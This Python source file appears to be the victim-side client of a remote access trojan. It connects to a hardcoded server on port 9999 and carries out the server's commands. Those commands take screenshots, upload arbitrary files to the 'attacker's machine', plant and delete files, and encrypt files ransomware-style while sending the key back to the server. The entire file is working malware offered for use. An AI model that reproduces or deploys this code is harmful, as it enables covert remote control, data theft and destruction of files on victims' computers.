import socket
import os
import pyautogui
import time
from zipfile import ZipFile
import os
from os.path import basename
from cryptography.fernet import Fernet

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

port = 9999
host = "192.168.56.1"
s.connect((host,port))

print("Connected to server successfully")
print("")

#command receiver and execution
while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "screenshot":
        os.system("python sshot.py")
        #PUT CODE TO STOP THE FILE EXECUTION HERE
        # create zipped file of the screenshots
        with ZipFile('screenshot.zip', 'w') as zipObj:
           # Iterate over all the files in directory
           for folderName, subfolders, filenames in os.walk("C:Users/humai/Desktop/screenshot/screenshot"):
               for filename in filenames:
                   filePath = os.path.join(folderName, filename)                   
                   zipObj.write(filePath, basename(filePath))
        print("Zipped file of the screenshots have been created on victim's machine successfully")
        #SEND COMMAND TO TRANSFER FILES

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("file sent successfully")

    elif command == "send_file":
        filename = s.recv(5000)
        print(filename)
        new_file = open(filename, 'wb')
        data = s.recv(5000)
        print(data)
        new_file.write(data)
        new_file.close()

    elif command == "remove_file":
        file = s.recv(5000)
        file = file.decode()
        print(file)
        os.remove(file)
        print(file, " deleted successfully!")
        
    elif command == "encrypt_file":
        filename = s.recv(1024)
        filename = filename.decode()
        print(filename)

        #GENERATE THE KEY
        key = Fernet.generate_key()
        file = open('key.key', 'wb')
        file.write(key)
        file.close()

        with open(filename, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(filename, 'wb') as f:
            f.write(encrypted)
        #SEND KEY FILE TO ATTACKERS MACHINE
        new_file = open('key.key', 'rb')
        data = new_file.read()
        s.send(data)
        print("Key sent successfully!")

        
    elif command == "decrypt_file":
        filename = s.recv(1024)
        filename = filename.decode()
        print(filename)

        #RECEIVE KEY FILE FROM ATTACKERS MACHINE
        new_file = open('key.key', 'wb')
        data = s.recv(5000)
        print(data)
        new_file.write(data)
        new_file.close()
        
        #RETRIEVE THE KEY
        file = open('key.key', 'rb')
        key = file.read()
        file.close()
        
        with open(filename, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        try:
            decrypted = fernet.decrypt(data)

            with open(filename, 'wb') as f:
                f.write(decrypted)

        except InvalidToken as e:
            print("Invalid key - Decryption unsuccessful!")

    
    else:
        print("Command not recognized")
    


